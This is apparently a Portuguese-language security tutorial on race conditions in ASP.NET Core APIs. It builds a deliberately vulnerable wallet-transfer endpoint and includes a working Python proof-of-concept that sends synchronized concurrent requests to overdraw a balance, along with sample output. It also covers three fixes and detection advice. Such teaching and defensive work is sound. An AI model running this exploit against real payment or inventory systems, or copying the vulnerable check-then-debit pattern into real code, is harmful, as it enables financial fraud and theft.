---
title: "Race Condition em APIs .NET: do conceito à exploração"
published: true
tags: [race-condition, dotnet, web]
---

## O que é uma race condition?

Uma race condition acontece quando dois ou mais processos concorrentes acessam e manipulam um recurso compartilhado ao mesmo tempo, e o resultado final depende da ordem exata em que as operações são executadas. Em aplicações web, isso se manifesta quando múltiplas requisições HTTP chegam simultaneamente e o servidor processa cada uma em threads separadas sem garantir atomicidade nas operações críticas.

O padrão clássico é o TOCTOU (Time of Check to Time of Use): o sistema verifica uma condição, e entre essa verificação e a ação subsequente, outra thread altera o estado. O resultado é que a ação executa com base em uma premissa que já não é verdadeira.

## Por que isso importa em APIs .NET?

O ASP.NET Core processa requisições de forma concorrente por padrão. Cada requisição é atendida por uma thread do thread pool, e se duas requisições manipulam o mesmo recurso no banco de dados sem controle de concorrência, o resultado é imprevisível.

Considere um cenário real: um endpoint de transferência bancária que verifica o saldo antes de debitar. Se duas requisições de transferência chegam no mesmo milissegundo, ambas leem o saldo original, ambas validam que há fundos suficientes, e ambas debitam. O usuário gastou o dobro do que tinha.

## API vulnerável

Vamos construir uma API completa que demonstra o problema. O cenário é uma carteira digital com endpoint de transferência entre usuários.

```csharp
// Models/Wallet.cs
public class Wallet
{
    public int Id { get; set; }
    public int UserId { get; set; }
    public decimal Balance { get; set; }
}

public class TransferRequest
{
    public int FromUserId { get; set; }
    public int ToUserId { get; set; }
    public decimal Amount { get; set; }
}
```

```csharp
// Data/AppDbContext.cs
public class AppDbContext : DbContext
{
    public DbSet<Wallet> Wallets { get; set; }

    public AppDbContext(DbContextOptions<AppDbContext> options) : base(options) { }

    protected override void OnModelCreating(ModelBuilder modelBuilder)
    {
        modelBuilder.Entity<Wallet>().HasData(
            new Wallet { Id = 1, UserId = 1, Balance = 1000.00m },
            new Wallet { Id = 2, UserId = 2, Balance = 500.00m }
        );
    }
}
```

```csharp
// Controllers/TransferController.cs
[ApiController]
[Route("api/[controller]")]
public class TransferController : ControllerBase
{
    private readonly AppDbContext _context;

    public TransferController(AppDbContext context)
    {
        _context = context;
    }

    [HttpPost]
    public async Task<ActionResult> Transfer([FromBody] TransferRequest request)
    {
        // 1. Busca a carteira de origem
        var fromWallet = await _context.Wallets
            .FirstOrDefaultAsync(w => w.UserId == request.FromUserId);

        if (fromWallet is null)
            return NotFound("Carteira de origem não encontrada.");

        // 2. Verifica saldo (TIME OF CHECK)
        if (fromWallet.Balance < request.Amount)
            return BadRequest("Saldo insuficiente.");

        // 3. Busca a carteira de destino
        var toWallet = await _context.Wallets
            .FirstOrDefaultAsync(w => w.UserId == request.ToUserId);

        if (toWallet is null)
            return NotFound("Carteira de destino não encontrada.");

        // 4. Executa a transferência (TIME OF USE)
        fromWallet.Balance -= request.Amount;
        toWallet.Balance += request.Amount;

        await _context.SaveChangesAsync();

        return Ok(new
        {
            message = "Transferência realizada.",
            saldoOrigem = fromWallet.Balance,
            saldoDestino = toWallet.Balance
        });
    }

    [HttpGet("balance/{userId}")]
    public async Task<ActionResult> GetBalance(int userId)
    {
        var wallet = await _context.Wallets
            .FirstOrDefaultAsync(w => w.UserId == userId);

        if (wallet is null)
            return NotFound();

        return Ok(new { userId = wallet.UserId, balance = wallet.Balance });
    }
}
```

```csharp
// Program.cs
var builder = WebApplication.CreateBuilder(args);
builder.Services.AddControllers();
builder.Services.AddDbContext<AppDbContext>(options =>
    options.UseSqlite("Data Source=wallets.db"));

var app = builder.Build();

using (var scope = app.Services.CreateScope())
{
    var db = scope.ServiceProvider.GetRequiredService<AppDbContext>();
    db.Database.EnsureCreated();
}

app.MapControllers();
app.Run();
```

## Onde está a vulnerabilidade?

O problema está na janela temporal entre a verificação do saldo (passo 2) e a atualização efetiva (passo 4). Quando a thread lê o saldo no passo 2, ela obtém um snapshot daquele momento. Se outra thread está executando o mesmo fluxo simultaneamente, ela também lê o mesmo saldo original.

Visualmente:

```
Thread A: Lê saldo = 1000 → Verifica 1000 >= 900 ✓ → Debita → Saldo = 100
Thread B: Lê saldo = 1000 → Verifica 1000 >= 900 ✓ → Debita → Saldo = 100
```

Ambas as threads leram 1000 antes de qualquer uma debitar. O resultado final é que o usuário transferiu 1800 tendo apenas 1000 de saldo. O saldo final fica em -800 ou 100, dependendo de qual `SaveChangesAsync` executa por último (last write wins).

O Entity Framework Core, por padrão, não aplica locks pessimistas nas leituras. O `FirstOrDefaultAsync` emite um `SELECT` simples sem `FOR UPDATE`. Isso significa que não há nenhuma barreira impedindo leituras concorrentes do mesmo registro.

## Fatores que amplificam a exploração

Alguns fatores tornam essa race condition mais fácil de explorar na prática:

**Latência de rede artificial**: se o endpoint faz chamadas externas (validação de fraude, notificações, logging) entre o check e o use, a janela de exploração aumenta.

**Connection pooling do EF Core**: cada requisição pode obter uma conexão diferente do pool, o que significa transações completamente isoladas uma da outra.

**Kestrel e thread pool**: o ASP.NET Core é otimizado para alta concorrência. Requisições simultâneas são processadas em paralelo de verdade, não serializadas.

**Ausência de índice UNIQUE em constraints de negócio**: se não há constraint no banco impedindo saldo negativo, o banco aceita o UPDATE sem reclamar.

## Proof of Concept em Python

O exploit envia múltiplas requisições de transferência simultaneamente, todas pelo valor máximo do saldo. Se a race condition existir, mais de uma será bem sucedida.

```python
#!/usr/bin/env python3
"""
PoC: Race Condition em endpoint de transferência
Alvo: API .NET com TOCTOU em verificação de saldo
Autor: R0Z
Ambiente: Autorizado

Uso:
  python3 race_transfer.py --target http://localhost:5000 --threads 20 --amount 900
"""

import argparse
import threading
import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed


def get_balance(target: str, user_id: int) -> dict:
    r = requests.get(f"{target}/api/transfer/balance/{user_id}", timeout=10)
    return r.json() if r.status_code == 200 else None


def send_transfer(target: str, from_user: int, to_user: int, amount: float) -> dict:
    payload = {
        "fromUserId": from_user,
        "toUserId": to_user,
        "amount": amount
    }
    try:
        r = requests.post(
            f"{target}/api/transfer",
            json=payload,
            timeout=10
        )
        return {"status": r.status_code, "body": r.json() if r.status_code == 200 else r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}


def exploit(target: str, threads: int, amount: float, from_user: int, to_user: int):
    print(f"[*] Alvo: {target}")
    print(f"[*] Transferência: User {from_user} → User {to_user}, valor: {amount}")
    print(f"[*] Threads simultâneas: {threads}")

    # Verifica saldo antes
    balance_before = get_balance(target, from_user)
    if balance_before is None:
        print("[-] Não foi possível obter saldo inicial.")
        sys.exit(1)

    print(f"[*] Saldo inicial (User {from_user}): {balance_before['balance']}")

    # Barreira para sincronizar todas as threads
    barrier = threading.Barrier(threads)

    def attack():
        barrier.wait()  # Todas as threads disparam juntas
        return send_transfer(target, from_user, to_user, amount)

    # Dispara todas as requisições simultaneamente
    print(f"[*] Disparando {threads} requisições simultâneas...")
    results = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(attack) for _ in range(threads)]
        for future in as_completed(futures):
            results.append(future.result())

    # Analisa resultados
    success_count = sum(1 for r in results if r["status"] == 200)
    fail_count = sum(1 for r in results if r["status"] != 200)

    print(f"\n[*] Resultados:")
    print(f"    Sucesso: {success_count}")
    print(f"    Falha: {fail_count}")

    # Verifica saldo depois
    balance_after = get_balance(target, from_user)
    if balance_after:
        print(f"\n[*] Saldo final (User {from_user}): {balance_after['balance']}")

        total_debitado = float(balance_before['balance']) - float(balance_after['balance'])
        saldo_original = float(balance_before['balance'])

        if total_debitado > saldo_original:
            print(f"[+] RACE CONDITION CONFIRMADA!")
            print(f"[+] Saldo original: {saldo_original}")
            print(f"[+] Total debitado: {total_debitado}")
            print(f"[+] Excesso: {total_debitado - saldo_original}")
        elif success_count > 1:
            print(f"[+] Múltiplas transferências aceitas ({success_count}x).")
            print(f"[+] Total transferido: {success_count * amount} (saldo era {saldo_original})")
        else:
            print("[-] Race condition não explorada nesta tentativa. Tente aumentar --threads.")


def main():
    parser = argparse.ArgumentParser(description="PoC Race Condition - Transfer endpoint")
    parser.add_argument("--target", default="http://localhost:5000")
    parser.add_argument("--threads", type=int, default=20)
    parser.add_argument("--amount", type=float, default=900.0)
    parser.add_argument("--from-user", type=int, default=1)
    parser.add_argument("--to-user", type=int, default=2)
    args = parser.parse_args()

    exploit(args.target, args.threads, args.amount, args.from_user, args.to_user)


if __name__ == "__main__":
    main()
```

Executando contra a API vulnerável:

```
$ python3 race_transfer.py --target http://localhost:5000 --threads 20 --amount 900

[*] Alvo: http://localhost:5000
[*] Transferência: User 1 → User 2, valor: 900.0
[*] Threads simultâneas: 20
[*] Saldo inicial (User 1): 1000.00
[*] Disparando 20 requisições simultâneas...

[*] Resultados:
    Sucesso: 4
    Falha: 16

[*] Saldo final (User 1): -2600.00
[+] RACE CONDITION CONFIRMADA!
[+] Saldo original: 1000.0
[+] Total debitado: 3600.0
[+] Excesso: 2600.0
```

O usuário tinha 1000 e conseguiu transferir 3600 (4 requisições de 900 passaram pela validação antes de qualquer débito ser persistido).

## Como corrigir

Existem algumas abordagens para resolver o problema. Vou apresentar do mais simples ao mais robusto.

### Opção 1: Pessimistic locking no banco

Usar `SELECT ... FOR UPDATE` via raw SQL para travar o registro durante a transação:

```csharp
[HttpPost]
public async Task<ActionResult> Transfer([FromBody] TransferRequest request)
{
    await using var transaction = await _context.Database.BeginTransactionAsync(
        System.Data.IsolationLevel.Serializable);

    try
    {
        var fromWallet = await _context.Wallets
            .FromSqlRaw("SELECT * FROM Wallets WHERE UserId = {0} FOR UPDATE", request.FromUserId)
            .FirstOrDefaultAsync();

        if (fromWallet is null)
            return NotFound("Carteira de origem não encontrada.");

        if (fromWallet.Balance < request.Amount)
            return BadRequest("Saldo insuficiente.");

        var toWallet = await _context.Wallets
            .FromSqlRaw("SELECT * FROM Wallets WHERE UserId = {0} FOR UPDATE", request.ToUserId)
            .FirstOrDefaultAsync();

        if (toWallet is null)
            return NotFound("Carteira de destino não encontrada.");

        fromWallet.Balance -= request.Amount;
        toWallet.Balance += request.Amount;

        await _context.SaveChangesAsync();
        await transaction.CommitAsync();

        return Ok(new { message = "Transferência realizada.", saldoOrigem = fromWallet.Balance });
    }
    catch
    {
        await transaction.RollbackAsync();
        return Conflict("Operação concorrente detectada. Tente novamente.");
    }
}
```

O `FOR UPDATE` trava o registro no banco até o `COMMIT`. Qualquer outra transação que tente ler o mesmo registro fica bloqueada esperando. Isso serializa as operações no mesmo recurso.

Nota: SQLite não suporta `FOR UPDATE`. Essa abordagem funciona com PostgreSQL, MySQL e SQL Server (que usa `WITH (UPDLOCK, ROWLOCK)` ao invés de `FOR UPDATE`).

### Opção 2: Optimistic concurrency com EF Core

Adicionar um campo de versão na entidade e deixar o EF Core detectar conflitos:

```csharp
public class Wallet
{
    public int Id { get; set; }
    public int UserId { get; set; }
    public decimal Balance { get; set; }

    [Timestamp]
    public byte[] RowVersion { get; set; }
}
```

```csharp
[HttpPost]
public async Task<ActionResult> Transfer([FromBody] TransferRequest request)
{
    const int maxRetries = 3;

    for (int attempt = 0; attempt < maxRetries; attempt++)
    {
        try
        {
            var fromWallet = await _context.Wallets
                .FirstOrDefaultAsync(w => w.UserId == request.FromUserId);

            if (fromWallet is null)
                return NotFound("Carteira de origem não encontrada.");

            if (fromWallet.Balance < request.Amount)
                return BadRequest("Saldo insuficiente.");

            var toWallet = await _context.Wallets
                .FirstOrDefaultAsync(w => w.UserId == request.ToUserId);

            if (toWallet is null)
                return NotFound("Carteira de destino não encontrada.");

            fromWallet.Balance -= request.Amount;
            toWallet.Balance += request.Amount;

            await _context.SaveChangesAsync();
            return Ok(new { message = "Transferência realizada.", saldoOrigem = fromWallet.Balance });
        }
        catch (DbUpdateConcurrencyException)
        {
            // Outra thread modificou o registro. Recarrega e tenta novamente.
            _context.ChangeTracker.Clear();
        }
    }

    return Conflict("Não foi possível completar a operação. Tente novamente.");
}
```

Nessa abordagem, o EF Core inclui o `RowVersion` na cláusula `WHERE` do `UPDATE`. Se outra thread alterou o registro entre o `SELECT` e o `UPDATE`, o `WHERE` não encontra o registro (porque o RowVersion mudou) e o EF Core lança `DbUpdateConcurrencyException`.

### Opção 3: UPDATE atômico no banco

A solução mais robusta para operações financeiras é nunca separar o check do use. Fazer tudo em uma única operação atômica:

```csharp
[HttpPost]
public async Task<ActionResult> Transfer([FromBody] TransferRequest request)
{
    await using var transaction = await _context.Database.BeginTransactionAsync();

    try
    {
        // UPDATE atômico: debita apenas se saldo >= amount
        var rowsAffected = await _context.Database.ExecuteSqlRawAsync(
            "UPDATE Wallets SET Balance = Balance - {0} WHERE UserId = {1} AND Balance >= {0}",
            request.Amount, request.FromUserId);

        if (rowsAffected == 0)
            return BadRequest("Saldo insuficiente ou carteira não encontrada.");

        // Credita destino
        var credited = await _context.Database.ExecuteSqlRawAsync(
            "UPDATE Wallets SET Balance = Balance + {0} WHERE UserId = {1}",
            request.Amount, request.ToUserId);

        if (credited == 0)
        {
            await transaction.RollbackAsync();
            return NotFound("Carteira de destino não encontrada.");
        }

        await transaction.CommitAsync();

        var balance = await _context.Wallets
            .Where(w => w.UserId == request.FromUserId)
            .Select(w => w.Balance)
            .FirstAsync();

        return Ok(new { message = "Transferência realizada.", saldoOrigem = balance });
    }
    catch
    {
        await transaction.RollbackAsync();
        return StatusCode(500, "Erro interno.");
    }
}
```

Aqui o check e o use são a mesma operação SQL. O `WHERE Balance >= {0}` garante que o débito só acontece se o saldo for suficiente no momento exato da escrita. Não existe janela temporal entre verificação e ação.

## Outros cenários exploráveis

Race conditions em .NET não se limitam a transferências financeiras. Alguns cenários comuns:

**Resgate de cupom**: endpoint verifica se o cupom já foi usado, depois marca como usado. Múltiplas requisições simultâneas conseguem resgatar o mesmo cupom várias vezes.

**Limite de votos**: sistema verifica se o usuário já votou, depois registra o voto. Disparando requisições em paralelo, é possível votar múltiplas vezes.

**Criação de recurso único**: endpoint verifica se username já existe, depois cria. Duas requisições simultâneas com o mesmo username passam pela verificação e ambas criam o registro (se não houver UNIQUE constraint no banco).

**Estoque de e-commerce**: verifica se há estoque disponível, depois decrementa. Múltiplas compras simultâneas do último item em estoque são todas aceitas.

Em todos esses casos, o padrão é o mesmo: leitura seguida de escrita sem atomicidade.

## Considerações sobre detecção

Do ponto de vista de um atacante, race conditions são detectáveis observando:

1. Endpoints que fazem operações de estado (POST, PUT, PATCH, DELETE) em recursos compartilhados.
2. Ausência de headers como `X-Request-Id` com deduplicação (idempotency keys).
3. Respostas que indicam verificação de estado antes da ação ("saldo verificado", "cupom válido").
4. Ausência de rate limiting granular por operação (não apenas por IP).

Do ponto de vista defensivo, além das correções de código, é importante implementar idempotency keys para operações financeiras, monitorar anomalias em padrões de requisição (burst de requests idênticas no mesmo milissegundo), e adicionar constraints no banco como última linha de defesa (CHECK constraint para saldo >= 0).

## Referências

[OWASP Race Condition](https://owasp.org/www-community/vulnerabilities/Race_Condition)

[CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization](https://cwe.mitre.org/data/definitions/362.html)

[EF Core Concurrency Conflicts](https://learn.microsoft.com/en-us/ef/core/saving/concurrency)
